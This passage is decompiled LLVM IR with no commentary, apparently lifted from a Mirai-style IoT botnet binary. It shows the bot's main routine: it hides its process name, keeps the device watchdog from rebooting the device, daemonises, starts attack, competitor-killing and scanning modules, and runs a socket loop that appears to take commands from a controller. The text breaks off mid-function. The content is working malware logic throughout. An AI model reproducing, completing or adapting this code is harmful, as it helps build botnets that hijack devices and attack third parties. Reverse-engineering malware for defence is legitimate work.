dec_label_pc_d8d0:                                ; preds = %dec_label_pc_d8d0, %dec_label_pc_d8b8
  %v0_d8dc = load i32, i32* @r4, align 4
  %v3_d8e4 = call i32 @ioctl(i32 %v0_d8dc, i32 -2147199227, i32 0)
  %v1_d8ec = call i32 @sleep(i32 10)
  br label %dec_label_pc_d8d0

dec_label_pc_d8f4:                                ; preds = %dec_label_pc_d880
  %v0_d8f4 = load i32, i32* @r5, align 4
  %v2_d8fc = inttoptr i32 %v0_d8f4 to i32*
  %v3_d8fc = call i32 @table_retrieve_val(i32 27, i32* %v2_d8fc)
  %v2_d904 = call i32 @__libc_open(i32 %v3_d8fc, i32 2)
  %v3_d908 = icmp eq i32 %v2_d904, -1
  store i32 %v2_d904, i32* @r4, align 4
  br i1 %v3_d908, label %dec_label_pc_d914, label %dec_label_pc_d8b8

dec_label_pc_d914:                                ; preds = %dec_label_pc_d8f4
  %v1_d918 = call i32 @table_lock_val(i32 26)
  %v1_d920 = call i32 @table_lock_val(i32 27)
  %v0_d924 = load i32, i32* @r5, align 4
  %v1_d928 = call i32 @__GI_exit(i32 %v0_d924)
  %v0_d92c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d92c, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d914
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d914, %bb14
  ret i32 %v1_d928

; uselistorder directives
  uselistorder i32 %v2_d904, { 1, 2, 0 }
  uselistorder i32 %v2_d8a8, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d848, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_d940 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d940, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d958 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_d964 = call i32 @__GI_sigaddset(i32 %v2_d940, i32 2)
  %v0_d968 = load i32, i32* @r5, align 4
  store i32 %v0_d968, i32* %r2.global-to-local, align 4
  %v4_d974 = call i32 @__GI_sigprocmask(i32 %v0_d968, i32* nonnull %stack_var_-64, i32 %v0_d968)
  %v2_d980 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_d98c = call i32 @bsd_signal(i32 5, i32 54912)
  %v0_d990 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_24728.93 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_2472c.94, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d990, i32* @global_var_2471c.58, align 4
  store i16 5888, i16* bitcast (i32* @global_var_2472a.95 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_24728.93 to i16*), align 4
  %v6_d9b8 = call i32 @table_init(i32 %v0_d990, i32 ptrtoint (i32* @global_var_2471c.58 to i32), i32 ptrtoint (i16** @global_var_24728.93 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d7f8.82 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21a90.84 to i32), i32* @lr, align 4
  %v2_d9c4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_d9c4, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_d7f8.82 to i32), i32* @global_var_21a90.84, align 4
  %v1_d9cc = call i32 @ensure_single_instance(i32 %v6_d9b8)
  %v1_d9d0 = call i32 @rand_init(i32 %v1_d9cc)
  store i32 %v2_d9c4, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d9dc = call i32 @util_zero()
  %v0_d9e0 = load i32, i32* @r6, align 4
  %v7_d9e0 = icmp eq i32 %v0_d9e0, 2
  br i1 %v7_d9e0, label %dec_label_pc_db10, label %dec_label_pc_d9e8

dec_label_pc_d9e8:                                ; preds = %dec_label_pc_db10, %entry, %dec_label_pc_db20
  %v0_d9e8 = call i32 @rand_next()
  store i32 %v0_d9e8, i32* @r6, align 4
  %v0_d9f0 = load i32, i32* @r8, align 4
  %v1_d9f0 = inttoptr i32 %v0_d9f0 to i32*
  %v2_d9f0 = load i32, i32* %v1_d9f0, align 4
  %v1_d9f4 = inttoptr i32 %v2_d9f0 to i8*
  %v2_d9f4 = call i32 @util_strlen(i8* %v1_d9f4)
  %v0_d9fc = load i32, i32* @r8, align 4
  %v1_d9fc = inttoptr i32 %v0_d9fc to i32*
  %v2_d9fc = load i32, i32* %v1_d9fc, align 4
  %v1_da00 = inttoptr i32 %v2_d9fc to i8*
  %v2_da00 = call i32 @util_strlen(i8* %v1_da00)
  %v1_da04 = sub i32 20, %v2_d9f4
  %v0_da0c = load i32, i32* @r6, align 4
  %v3_da10 = urem i32 %v0_da0c, %v1_da04
  %v2_da14 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_da14, i32* @r5, align 4
  %v2_da18 = add i32 %v3_da10, %v2_da00
  store i32 %v2_da18, i32* @r4, align 4
  %v2_da24 = call i32 @rand_alpha_str(i32 %v2_da14, i32 %v2_da18)
  %v2_da28 = ptrtoint i32* %stack_var_-40 to i32
  %v1_da2c = load i32, i32* @r4, align 4
  %v2_da2c = add i32 %v1_da2c, %v2_da28
  store i32 %v2_da2c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_da38 = load i32, i32* @r8, align 4
  %v1_da38 = inttoptr i32 %v0_da38 to i32*
  %v2_da38 = load i32, i32* %v1_da38, align 4
  store i32 %v2_da38, i32* @r0, align 4
  %v3_da3c = add i32 %v2_da2c, -80
  %v4_da3c = inttoptr i32 %v3_da3c to i8*
  store i8 0, i8* %v4_da3c, align 1
  %v2_da40 = inttoptr i32 %v2_da38 to i8*
  %v3_da40 = call i32 @util_strcpy(i8* %v2_da40, i32 %v2_da14)
  store i32 32, i32* @r1, align 4
  store i32 %v2_da14, i32* @r0, align 4
  %v0_da4c = call i32 @util_zero()
  %v0_da50 = call i32 @rand_next()
  store i32 %v0_da50, i32* @r7, align 4
  %v0_da58 = load i32, i32* @r8, align 4
  %v1_da58 = inttoptr i32 %v0_da58 to i32*
  %v2_da58 = load i32, i32* %v1_da58, align 4
  %v1_da5c = inttoptr i32 %v2_da58 to i8*
  %v2_da5c = call i32 @util_strlen(i8* %v1_da5c)
  store i32 %v2_da5c, i32* @r6, align 4
  %v0_da64 = load i32, i32* @r8, align 4
  %v1_da64 = inttoptr i32 %v0_da64 to i32*
  %v2_da64 = load i32, i32* %v1_da64, align 4
  %v1_da68 = inttoptr i32 %v2_da64 to i8*
  %v2_da68 = call i32 @util_strlen(i8* %v1_da68)
  %v0_da6c = load i32, i32* @r6, align 4
  %v1_da6c = sub i32 20, %v0_da6c
  %v0_da74 = load i32, i32* @r7, align 4
  %v3_da78 = urem i32 %v0_da74, %v1_da6c
  %v2_da7c = add i32 %v3_da78, %v2_da68
  store i32 %v2_da7c, i32* @r4, align 4
  %v2_da88 = call i32 @rand_alpha_str(i32 %v2_da14, i32 %v2_da7c)
  store i32 %v2_da28, i32* %r2.global-to-local, align 4
  %v1_da90 = load i32, i32* @r4, align 4
  %v2_da90 = add i32 %v1_da90, %v2_da28
  store i32 %v2_da90, i32* %r3.global-to-local, align 4
  %v0_da94 = load i32, i32* @sl, align 4
  %v1_da94 = trunc i32 %v0_da94 to i8
  %v3_da94 = add i32 %v2_da90, -80
  %v4_da94 = inttoptr i32 %v3_da94 to i8*
  store i8 %v1_da94, i8* %v4_da94, align 1
  %v4_daa0 = call i32 @prctl(i32 15, i32 %v2_da14, i32 %v2_da28, i32 %v2_da90)
  %v1_daa8 = call i32 @table_unlock_val(i32 5)
  %v3_dab8 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_dabc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_dabc, i32* @r2, align 4
  %v2_dac8 = inttoptr i32 %v3_dab8 to i64*
  %v3_dac8 = call i32 @__GI___libc_write(i32 1, i64* %v2_dac8)
  store i32 1, i32* @r2, align 4
  %v3_dad8 = call i32 @__GI___libc_write(i32 1, i64* bitcast (i32* @global_var_1927c.105 to i64*))
  %v1_dae0 = call i32 @table_lock_val(i32 5)
  %v1_dae4 = call i32 @attack_init(i32 %v1_dae0)
  %v1_dae8 = call i32 @killer_init(i32 %v1_dae4)
  %v1_daec = call i32 @watchdog_maintain(i32 %v1_dae8)
  %v0_daf0 = call i32 @__libc_fork()
  %v1_daf4 = load i32, i32* @sl, align 4
  %v7_daf8 = icmp sgt i32 %v0_daf0, %v1_daf4
  br i1 %v7_daf8, label %dec_label_pc_dafc, label %dec_label_pc_db48

dec_label_pc_dafc:                                ; preds = %dec_label_pc_d9e8
  ret i32 %v1_daf4

dec_label_pc_db10:                                ; preds = %entry
  %v0_db10 = load i32, i32* @r8, align 4
  %v1_db10 = add i32 %v0_db10, 4
  %v2_db10 = inttoptr i32 %v1_db10 to i32*
  %v3_db10 = load i32, i32* %v2_db10, align 4
  %v1_db14 = inttoptr i32 %v3_db10 to i8*
  %v2_db14 = call i32 @util_strlen(i8* %v1_db14)
  %v8_db1c = icmp sgt i32 %v2_db14, 31
  br i1 %v8_db1c, label %dec_label_pc_d9e8, label %dec_label_pc_db20

dec_label_pc_db20:                                ; preds = %dec_label_pc_db10
  %v0_db20 = load i32, i32* @r8, align 4
  %v1_db20 = add i32 %v0_db20, 4
  %v2_db20 = inttoptr i32 %v1_db20 to i32*
  %v3_db20 = load i32, i32* %v2_db20, align 4
  store i32 %v2_d9c4, i32* @r0, align 4
  %v2_db28 = bitcast i32* %stack_var_-152 to i8*
  %v3_db28 = call i32 @util_strcpy(i8* %v2_db28, i32 %v3_db20)
  %v0_db2c = load i32, i32* @r8, align 4
  %v1_db2c = add i32 %v0_db2c, 4
  %v2_db2c = inttoptr i32 %v1_db2c to i32*
  %v3_db2c = load i32, i32* %v2_db2c, align 4
  %v1_db34 = inttoptr i32 %v3_db2c to i8*
  %v2_db34 = call i32 @util_strlen(i8* %v1_db34)
  store i32 %v2_db34, i32* @r1, align 4
  store i32 %v3_db2c, i32* @r0, align 4
  %v0_db40 = call i32 @util_zero()
  br label %dec_label_pc_d9e8

dec_label_pc_db48:                                ; preds = %dec_label_pc_d9e8
  %v1_db48 = call i32 @__GI_setsid(i32 %v0_daf0)
  %v0_db50 = load i32, i32* @sl, align 4
  %v1_db54 = call i32 @__GI___libc_close(i32 %v0_db50)
  %v1_db5c = call i32 @__GI___libc_close(i32 1)
  %v1_db64 = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_21a8c.107 to i32), i32* @fp, align 4
  %v1_db6c = call i32 @attack_init(i32 %v1_db64)
  %v1_db70 = call i32 @killer_init(i32 %v1_db6c)
  %v1_db74 = call i32 @watchdog_maintain(i32 %v1_db70)
  %v1_db78 = call i32 @scanner_init(i32 %v1_db74)
  %v0_db7c = load i32, i32* @sl, align 4
  %v2_db80 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_db80, i32* @r7, align 4
  %v2_db84 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_db84, i32* @r6, align 4
  %v2_dc64 = ptrtoint i32* %stack_var_-72 to i32
  %v2_dcb4 = ptrtoint i32* %stack_var_-168 to i32
  %v2_de90 = ptrtoint i32* %stack_var_-56 to i32
  %v2_de98 = ptrtoint i8** %stack_var_-42 to i32
  %v2_e03c = ptrtoint i32* %stack_var_-1432 to i32
  %v2_deb4 = ptrtoint i32* %stack_var_-52 to i32
  %v1_df64 = bitcast i32* %stack_var_-152 to i8*
  %v2_df28 = ptrtoint i32* %stack_var_-88 to i32
  %v1_df40 = sub i32 0, %v1_db48
  br label %dec_label_pc_db88

dec_label_pc_db88:                                ; preds = %dec_label_pc_dfc4, %dec_label_pc_e060, %bb44, %dec_label_pc_df60, %dec_label_pc_dd98, %dec_label_pc_dd88, %bb41, %dec_label_pc_e0b4, %dec_label_pc_e020, %dec_label_pc_dfd4, %dec_label_pc_dfb0, %dec_label_pc_dee0, %dec_label_pc_de08, %dec_label_pc_dd40, %dec_label_pc_db48
  %stack_var_-1436.0 = phi i32 [ %v0_db7c, %dec_label_pc_db48 ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_dd88 ], [ %stack_var_-1436.1, %dec_label_pc_dd98 ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_dfd4 ], [ %stack_var_-1436.1, %dec_label_pc_de08 ], [ %stack_var_-1436.1, %dec_label_pc_e060 ], [ %stack_var_-1436.1, %dec_label_pc_e0b4 ], [ %stack_var_-1436.1, %dec_label_pc_e020 ], [ %stack_var_-1436.1, %dec_label_pc_dd40 ], [ %stack_var_-1436.1, %dec_label_pc_df60 ], [ %stack_var_-1436.1, %dec_label_pc_dfb0 ], [ %stack_var_-1436.1, %dec_label_pc_dee0 ], [ %stack_var_-1436.1, %dec_label_pc_dfc4 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db94

dec_label_pc_db94:                                ; preds = %dec_label_pc_db94, %dec_label_pc_db88
  %v1_db98 = phi i32 [ %v1_db9c, %dec_label_pc_db94 ], [ 4, %dec_label_pc_db88 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_db98 = load i32, i32* @r7, align 4
  %v3_db98 = add i32 %v2_db98, %v1_db98
  %v4_db98 = inttoptr i32 %v3_db98 to i32*
  store i32 0, i32* %v4_db98, align 4
  %v0_db9c = load i32, i32* %r3.global-to-local, align 4
  %v1_db9c = add i32 %v0_db9c, 4
  store i32 %v1_db9c, i32* %r3.global-to-local, align 4
  %v7_dba0 = icmp eq i32 %v1_db9c, 128
  br i1 %v7_dba0, label %dec_label_pc_dba8, label %dec_label_pc_db94

dec_label_pc_dba8:                                ; preds = %dec_label_pc_db94
  %v0_dba8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dba8, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dbb0

dec_label_pc_dbb0:                                ; preds = %dec_label_pc_dbb0, %dec_label_pc_dba8
  %v1_dbb4 = phi i32 [ %v1_dbb8, %dec_label_pc_dbb0 ], [ 4, %dec_label_pc_dba8 ]
  store i32 0, i32* @r4, align 4
  %v2_dbb4 = load i32, i32* @r6, align 4
  %v3_dbb4 = add i32 %v2_dbb4, %v1_dbb4
  %v4_dbb4 = inttoptr i32 %v3_dbb4 to i32*
  store i32 0, i32* %v4_dbb4, align 4
  %v0_dbb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dbb8 = add i32 %v0_dbb8, 4
  store i32 %v1_dbb8, i32* %r3.global-to-local, align 4
  %v7_dbbc = icmp eq i32 %v1_dbb8, 128
  br i1 %v7_dbbc, label %dec_label_pc_dbc4, label %dec_label_pc_dbb0

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_dbb0
  store i32 ptrtoint (i32* @global_var_21a88.86 to i32), i32* %r3.global-to-local, align 4
  %v2_dbc8 = load i32, i32* @global_var_21a88.86, align 4
  %v7_dbcc = icmp eq i32 %v2_dbc8, -1
  br i1 %v7_dbcc, label %dec_label_pc_dbf8, label %dec_label_pc_dbd4

dec_label_pc_dbd4:                                ; preds = %dec_label_pc_dbc4
  %v3_dbd4 = udiv i32 %v2_dbc8, 32
  %v3_dbd8 = mul nuw nsw i32 %v3_dbd4, 4
  store i32 %v2_da28, i32* %ip.global-to-local, align 4
  %v2_dbe0 = add i32 %v3_dbd8, %v2_da28
  store i32 %v2_dbe0, i32* %r3.global-to-local, align 4
  %v1_dbe4 = add i32 %v2_dbe0, -240
  %v2_dbe4 = inttoptr i32 %v1_dbe4 to i32*
  %v3_dbe4 = load i32, i32* %v2_dbe4, align 4
  %v1_dbe8 = urem i32 %v2_dbc8, 32
  %v7_dbf0 = shl i32 1, %v1_dbe8
  %v8_dbf0 = or i32 %v3_dbe4, %v7_dbf0
  store i32 %v8_dbf0, i32* %r2.global-to-local, align 4
  store i32 %v8_dbf0, i32* %v2_dbe4, align 4
  br label %dec_label_pc_dbf8

dec_label_pc_dbf8:                                ; preds = %dec_label_pc_dbc4, %dec_label_pc_dbd4
  %v2_dbf8 = load i32, i32* @global_var_21a8c.107, align 4
  store i32 %v2_dbf8, i32* @r3, align 4
  %v7_dbfc = icmp eq i32 %v2_dbf8, -1
  store i32 ptrtoint (i32* @global_var_21a8c.107 to i32), i32* @r8, align 4
  br i1 %v7_dbfc, label %dec_label_pc_de20, label %dec_label_pc_dc08

dec_label_pc_dc08:                                ; preds = %dec_label_pc_de20, %dec_label_pc_dbf8, %bb43
  %v2_dc0c = load i8, i8* bitcast (i8** @global_var_21c0c.110 to i8*), align 4
  %v2_dc10 = icmp eq i8 %v2_dc0c, 0
  %v2_dd5c = load i32, i32* @global_var_21a8c.107, align 4
  store i32 %v2_dd5c, i32* %ip.global-to-local, align 4
  %v3_dd60 = udiv i32 %v2_dd5c, 32
  store i32 %v3_dd60, i32* %r3.global-to-local, align 4
  br i1 %v2_dc10, label %dec_label_pc_dd5c, label %dec_label_pc_dc18

dec_label_pc_dc18:                                ; preds = %dec_label_pc_dc08
  %v3_dc24 = mul nuw nsw i32 %v3_dd60, 4
  %v2_dc28 = add i32 %v3_dc24, %v2_da28
  store i32 %v2_dc28, i32* %r3.global-to-local, align 4
  %v1_dc2c = add i32 %v2_dc28, -368
  %v2_dc2c = inttoptr i32 %v1_dc2c to i32*
  %v3_dc2c = load i32, i32* %v2_dc2c, align 4
  %v1_dc30 = urem i32 %v2_dd5c, 32
  %v7_dc38 = shl i32 1, %v1_dc30
  %v8_dc38 = or i32 %v3_dc2c, %v7_dc38
  store i32 %v8_dc38, i32* %r2.global-to-local, align 4
  store i32 %v8_dc38, i32* %v2_dc2c, align 4
  br label %dec_label_pc_dc40

dec_label_pc_dc40:                                ; preds = %dec_label_pc_dd5c, %dec_label_pc_dc18
  store i32 ptrtoint (i32* @global_var_21a88.86 to i32), i32* %r3.global-to-local, align 4
  %v2_dc44 = load i32, i32* @global_var_21a88.86, align 4
  store i32 0, i32* @lr, align 4
  %v0_dc4c = load i32, i32* %ip.global-to-local, align 4
  %v5_dc50 = icmp slt i32 %v0_dc4c, %v2_dc44
  br i1 %v5_dc50, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_dc40
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_dc40, %bb
  %v0_dc60 = phi i32 [ %v2_dc44, %dec_label_pc_dc40 ], [ %v0_dc4c, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_dc60 = add i32 %v0_dc60, 1
  store i32 %v2_dc64, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_db84, i32* %r2.global-to-local, align 4
  %v5_dc7c = call i32 @__libc_select(i32 %v1_dc60, i32 %v2_db80, i32 %v2_db84, i32 0, i32 %v2_dc64)
  %v8_dc80 = icmp eq i32 %v5_dc7c, -1
  br i1 %v8_dc80, label %dec_label_pc_db88, label %dec_label_pc_dc88

dec_label_pc_dc88:                                ; preds = %bb41
  %v6_dc7c = trunc i32 %v5_dc7c to i16
  %v3_dc88 = icmp eq i16 %v6_dc7c, 0
  br i1 %v3_dc88, label %dec_label_pc_dc90, label %dec_label_pc_dcc4

dec_label_pc_dc90:                                ; preds = %dec_label_pc_dc88
  %v5_dc9c = srem i32 %stack_var_-1436.0, 6
  %v4_dca4 = sub i32 %stack_var_-1436.0, %v5_dc9c
  store i32 %v4_dca4, i32* %r3.global-to-local, align 4
  %v2_dcac = icmp eq i32 %v5_dc9c, 0
  %v1_dcb0 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_dcb0, i32* @lr, align 4
  store i32 %v2_dcb4, i32* %r2.global-to-local, align 4
  %v7_dcb8 = inttoptr i32 %v5_dc7c to i8*
  store i8* %v7_dcb8, i8** %stack_var_-42, align 4
  br i1 %v2_dcac, label %dec_label_pc_de90, label %dec_label_pc_dcc4

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_dc88, %dec_label_pc_dc90, %dec_label_pc_de90
  %stack_var_-1436.1 = phi i32 [ %v1_dcb0, %dec_label_pc_de90 ], [ %v1_dcb0, %dec_label_pc_dc90 ], [ %stack_var_-1436.0, %dec_label_pc_dc88 ]
  store i32 ptrtoint (i32* @global_var_21a88.86 to i32), i32* %r3.global-to-local, align 4
  %v2_dcc8 = load i32, i32* @global_var_21a88.86, align 4
  %v7_dccc = icmp eq i32 %v2_dcc8, -1
  br i1 %v7_dccc, label %dec_label_pc_dcf8, label %dec_label_pc_dcd4

dec_label_pc_dcd4:                                ; preds = %dec_label_pc_dcc4
  %v3_dcd4 = udiv i32 %v2_dcc8, 32
  %v3_dcd8 = mul nuw nsw i32 %v3_dcd4, 4
  store i32 %v2_da28, i32* %ip.global-to-local, align 4
  %v2_dce0 = add i32 %v3_dcd8, %v2_da28
  store i32 %v2_dce0, i32* %r3.global-to-local, align 4
  %v1_dce4 = add i32 %v2_dce0, -240
  %v2_dce4 = inttoptr i32 %v1_dce4 to i32*
  %v3_dce4 = load i32, i32* %v2_dce4, align 4
  %v1_dce8 = urem i32 %v2_dcc8, 32
  %v6_dcec = ashr i32 %v3_dce4, %v1_dce8
  store i32 %v6_dcec, i32* %r2.global-to-local, align 4
  %v1_dcf0 = urem i32 %v6_dcec, 2
  %v2_dcf0 = icmp eq i32 %v1_dcf0, 0
  br i1 %v2_dcf0, label %dec_label_pc_dcf8, label %dec_label_pc_df1c

dec_label_pc_dcf8:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dcc4
  %v2_dcfc = load i8, i8* bitcast (i8** @global_var_21c0c.110 to i8*), align 4
  %v3_dcfc = zext i8 %v2_dcfc to i32
  store i32 %v3_dcfc, i32* @r4, align 4
  %v2_dd00 = icmp eq i8 %v2_dcfc, 0
  %v2_dd88 = load i32, i32* @global_var_21a8c.107, align 4
  br i1 %v2_dd00, label %dec_label_pc_dd88, label %dec_label_pc_dd08

dec_label_pc_dd08:                                ; preds = %dec_label_pc_dcf8
  %v3_dd0c = udiv i32 %v2_dd88, 32
  store i32 %v2_da28, i32* %r2.global-to-local, align 4
  %v3_dd14 = mul nuw nsw i32 %v3_dd0c, 4
  %v2_dd18 = add i32 %v3_dd14, %v2_da28
  store i32 %v2_dd18, i32* %r3.global-to-local, align 4
  %v1_dd1c = add i32 %v2_dd18, -368
  %v2_dd1c = inttoptr i32 %v1_dd1c to i32*
  %v3_dd1c = load i32, i32* %v2_dd1c, align 4
  %v1_dd20 = urem i32 %v2_dd88, 32
  %v6_dd24 = ashr i32 %v3_dd1c, %v1_dd20
  store i32 %v6_dd24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_21c0c.110 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dd30 = urem i32 %v6_dd24, 2
  %v2_dd30 = icmp eq i32 %v1_dd30, 0
  store i8 0, i8* bitcast (i8** @global_var_21c0c.110 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_21a8c.107 to i32), i32* @r5, align 4
  br i1 %v2_dd30, label %dec_label_pc_dd40, label %dec_label_pc_deac

dec_label_pc_dd40:                                ; preds = %dec_label_pc_dd08
  store i32 56648, i32* @lr, align 4
  %v1_dd44 = icmp ne i32 %v2_dd88, -1
  call void @__pseudo_cond_branch(i1 %v1_dd44, i32 ptrtoint (i32* @global_var_14250.112 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dd4c = load i32, i32* @r5, align 4
  %v2_dd4c = inttoptr i32 %v1_dd4c to i32*
  store i32 -1, i32* %v2_dd4c, align 4
  %v1_dd54 = call i32 @sleep(i32 1)
  br label %dec_label_pc_db88

dec_label_pc_dd5c:                                ; preds = %dec_label_pc_dc08
  store i32 %v2_da28, i32* %r2.global-to-local, align 4
  %v3_dd68 = mul nuw nsw i32 %v3_dd60, 4
  %v2_dd6c = add i32 %v3_dd68, %v2_da28
  store i32 %v2_dd6c, i32* %r3.global-to-local, align 4
  %v1_dd70 = add i32 %v2_dd6c, -240
  %v2_dd70 = inttoptr i32 %v1_dd70 to i32*
  %v3_dd70 = load i32, i32* %v2_dd70, align 4
  %v1_dd74 = urem i32 %v2_dd5c, 32
  %v7_dd7c = shl i32 1, %v1_dd74
  %v8_dd7c = or i32 %v3_dd70, %v7_dd7c
  store i32 %v8_dd7c, i32* %r2.global-to-local, align 4
  store i32 %v8_dd7c, i32* %v2_dd70, align 4
  br label %dec_label_pc_dc40

dec_label_pc_dd88:                                ; preds = %dec_label_pc_dcf8
  %v7_dd8c = icmp eq i32 %v2_dd88, -1
  store i32 ptrtoint (i32* @global_var_21a8c.107 to i32), i32* @r8, align 4
  br i1 %v7_dd8c, label %dec_label_pc_db88, label %dec_label_pc_dd98

dec_label_pc_dd98:                                ; preds = %dec_label_pc_dd88
  %v3_dd98 = udiv i32 %v2_dd88, 32
  store i32 %v2_da28, i32* %r2.global-to-local, align 4
  %v3_dda0 = mul nuw nsw i32 %v3_dd98, 4
  %v2_dda4 = add i32 %v3_dda0, %v2_da28
  store i32 %v2_dda4, i32* %r3.global-to-local, align 4
  %v1_dda8 = add i32 %v2_dda4, -240
  %v2_dda8 = inttoptr i32 %v1_dda8 to i32*
  %v3_dda8 = load i32, i32* %v2_dda8, align 4
  %v1_ddac = urem i32 %v2_dd88, 32
  %v6_ddb0 = ashr i32 %v3_dda8, %v1_ddac
  store i32 %v6_ddb0, i32* %r2.global-to-local, align 4
  %v1_ddb4 = urem i32 %v6_ddb0, 2
  %v2_ddb4 = icmp eq i32 %v1_ddb4, 0
  br i1 %v2_ddb4, label %dec_label_pc_db88, label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %dec_label_pc_dd98
  %v6_ddc0 = inttoptr i32 %v3_dcfc to i8*
  store i8* %v6_ddc0, i8** %stack_var_-42, align 4
  store i32 %v2_de98, i32* @sl, align 4
  %v0_ddc4 = call i32 @__GI___errno_location()
  %v0_ddc8 = load i32, i32* @r4, align 4
  %v2_ddc8 = inttoptr i32 %v0_ddc4 to i32*
  store i32 %v0_ddc8, i32* %v2_ddc8, align 4
  store i32 %v0_ddc4, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_ddd8 = load i32, i32* @global_var_21a8c.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dde4 = call i32 @__libc_recv(i32 %v2_ddd8, i32 %v2_de98, i32 2, i32 16386)
  %v7_dde8 = icmp eq i32 %v4_dde4, -1
  br i1 %v7_dde8, label %dec_label_pc_dfc4, label %dec_label_pc_ddf0

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_ddbc
  %v2_ddf0 = icmp eq i32 %v4_dde4, 0
  br i1 %v2_ddf0, label %dec_label_pc_dfd4, label %dec_label_pc_ddf8

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_ddf0
  store i32 %v2_dcb4, i32* %ip.global-to-local, align 4
  %v3_ddfc = load i8*, i8** %stack_var_-42, align 4
  %v4_ddfc = ptrtoint i8* %v3_ddfc to i32
  store i32 %v4_ddfc, i32* %r3.global-to-local, align 4
  %v2_de00 = icmp eq i8* %v3_ddfc, null
  br i1 %v2_de00, label %dec_label_pc_de08, label %dec_label_pc_e004

dec_label_pc_de08:                                ; preds = %dec_label_pc_ddf8
  %v2_de08 = load i32, i32* @global_var_21a8c.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_de14 = add i32 %v4_ddfc, 16384
  store i32 %v1_de14, i32* %r3.global-to-local, align 4
  %v4_de18 = call i32 @__libc_recv(i32 %v2_de08, i32 %v2_de98, i32 2, i32 %v1_de14)
  br label %dec_label_pc_db88

dec_label_pc_de20:                                ; preds = %dec_label_pc_dbf8
  %v0_de28 = load i32, i32* @r4, align 4
  store i32 %v0_de28, i32* %r2.global-to-local, align 4
  %v3_de2c = call i32 @socket(i32 2, i32 1, i32 %v0_de28)
  %v7_de30 = icmp eq i32 %v3_de2c, -1
  store i32 %v3_de2c, i32* @r5, align 4
  %v1_de38 = load i32, i32* @r8, align 4
  %v2_de38 = inttoptr i32 %v1_de38 to i32*
  store i32 %v3_de2c, i32* %v2_de38, align 4
  br i1 %v7_de30, label %dec_label_pc_dc08, label %dec_label_pc_de40

dec_label_pc_de40:                                ; preds = %dec_label_pc_de20
  %v0_de40 = load i32, i32* @r4, align 4
  store i32 %v0_de40, i32* @r2, align 4
  %v2_de48 = call i32 @__libc_fcntl(i32 %v3_de2c, i32 3)
  %v1_de50 = or i32 %v2_de48, 2048
